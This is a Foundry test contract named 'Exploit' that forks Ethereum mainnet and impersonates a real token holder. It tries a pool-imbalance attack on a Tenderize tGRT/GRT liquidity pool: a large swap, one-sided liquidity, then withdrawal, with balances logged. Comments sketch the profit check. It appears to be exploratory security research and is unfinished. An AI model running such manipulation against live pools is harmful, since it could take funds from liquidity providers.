// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../src/interfaces.sol";

interface ITenderize{
    function swap(
        IERC20 _tokenFrom,
        uint256 _dx,
        uint256 _minDy,
        uint256 _deadline
    ) external;

    function addLiquidity(
        uint256[2] calldata _amounts,
        uint256 _minToMint,
        uint256 _deadline
    ) external;

    function removeLiquidity(
        uint256 amount,
        uint256[2] calldata minAmounts,
        uint256 deadline
    ) external;

    function removeLiquidityImbalance(
        uint256[2] calldata _amounts,
        uint256 _maxBurnAmount,
        uint256 _deadline
    ) external returns (uint256 lpBurned);

    function calculateTokenAmount(uint256[] calldata amounts, bool deposit)
        external
        view
        returns (uint256 tokensToReceive);

    function calculateRemoveLiquidityOneToken(uint256 tokenAmount, IERC20 tokenReceive)
        external
        view
        returns (uint256 tokensToReceive);
    
    function getVirtualPrice() external view returns (uint256 virtualPrice);


    function getToken0() external view returns (IERC20 token0);
    function getToken1() external view returns (IERC20 token1);
    function getToken0Balance() external view returns (uint256 token0Balance);
    function getToken1Balance() external view returns (uint256 token1Balance);

}

interface ILp {
    
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint amountj) external;
}

// interface IFactory {
//     function deploy(calldata) external returns (ITenderSwap tenderSwap) 
// }

contract Exploit is Test {

    ITenderize pool = ITenderize(0xF56F61F8181d118c010Ca9c5f1e9e447e37B207e);

    address whale = 0xF7Cd385CB9a442358B892B14301F6310e57CC5c9;

    address someDude = 0x6b75704a6e127E391838888150a28f9A8B266788;

    address tGRTHolder = 0x79f709b01033dfDBf065cfF7a1Abe7C72011D3EB;

    ILp LpToken = ILp(0xAd93b1beF320fbbB9D1645dFAFc7550FC254F272); 


    address Factory = 0x64Cc4DaE4972Ce88d6d9722c25C67f8f85acDa6d;

    function setUp() external {
        vm.createSelectFork("mainnet" , 16432749);
        vm.label(address(this), "Attacker");
    }

    function test_pool_imbalance() public {
        vm.startPrank(tGRTHolder);

        //tGRT
        IERC20 token0 = pool.getToken0();

        //GRT
        IERC20 token1 = pool.getToken1(); 

        token0.approve(address(pool), type(uint).max); 
        token1.approve(address(pool), type(uint).max); 


        uint userBal_token1_before = token1.balanceOf(tGRTHolder);
        //create pool imbalance 
        console.log("user bal token0 before swap    ", token0.balanceOf(tGRTHolder));
        console.log("user bal token1 before swap    ", token1.balanceOf(tGRTHolder));
        console.log("pool bal token0 before swap    ", token0.balanceOf(address(pool)));
        console.log("pool bal token1 before swap    ", token1.balanceOf(address(pool)));

        console.log("-----------");

        pool.swap(token0, token0.balanceOf(tGRTHolder), 0, block.timestamp + 500 seconds);




        uint userBal_token1_after = token1.balanceOf(tGRTHolder);

        uint rebalance_amount = userBal_token1_after - userBal_token1_before; 

        // console.log("rebalance amount               ", rebalance_amount);

       //add liuidity

       console.log("Lp tokens before", LpToken.balanceOf(tGRTHolder));
    
       uint[2] memory arry;

       arry[0] = 0; // user can lose token
       arry[1] = rebalance_amount;
       pool.addLiquidity(
        arry, 
        0, 
        block.timestamp + 500 seconds
        );

        uint[2] memory removeLp;
        removeLp[0] = 0;
        removeLp[1] = 0;
        
        LpToken.approve(address(pool), type(uint).max);

        pool.removeLiquidity(LpToken.balanceOf(tGRTHolder), removeLp, block.timestamp + 500 seconds);

        console.log("user bal token0 after swap     ", token0.balanceOf(tGRTHolder));
        console.log("user bal token1 after swap     ", token1.balanceOf(tGRTHolder));
        console.log("pool bal token0 after swap     ", token0.balanceOf(address(pool)));
        console.log("pool bal token1 after swap     ", token1.balanceOf(address(pool)));
        


        
        // pool of AB 
        // swap A for B so there is less B then A on the pool
        // provideLiquidity (a.balanceOf(pool) with token B )


        // imbalance the pool
        // add liquidity 
        // imbalance the pool
        // add liquidity 
        // if token0.balanceOf(owner) >= balance before the process 
        // else
        // lp.burn return > balance before the process 

        // pool.swap(token1, rebalance_amount, 0, block.timestamp + 500 seconds);

        console.log("Lp tokens after", LpToken.balanceOf(tGRTHolder));
        // check if attack will cover the:
        // - immbalancing the pool
        // - balancing the pool
        // - withdrawing the liquidity 
        // AB pool, swaping A = 100$
        // 100$ + balancing the pool < LPTokens burn 

    }
}

